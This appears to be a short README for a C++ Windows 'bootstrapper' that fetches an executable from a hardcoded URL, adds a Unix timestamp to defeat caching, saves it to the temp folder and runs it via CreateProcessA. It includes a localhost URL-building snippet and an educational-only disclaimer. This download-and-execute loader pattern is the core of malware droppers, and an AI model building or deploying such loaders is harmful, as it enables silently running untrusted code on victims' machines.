# Simple-Bootstrapper

A minimal Windows bootstrapper that downloads and executes a remote payload (`.exe`) from a specified URL. It includes basic caching prevention using Unix time and uses `CreateProcessA` to run the downloaded file.

## ⚠️ Disclaimer
> This project is intended for **educational purposes only**. Downloading and executing external files without validation poses a **serious security risk** and should never be used in production or malicious contexts.

## 💡 Features

- Downloads a specified executable from a hardcoded URL
- Appends a timestamp to bypass simple caching
- Saves the file to the system’s temp folder
- Executes the file using `CreateProcessA`
- Waits for the process to exit and handles cleanup

## 🧠 How It Works

```cpp
std::string appname = "app.exe";
std::string downloadURL = "http://127.0.0.1:8401/" + appname + "?t=" + std::to_string(std::time(nullptr));
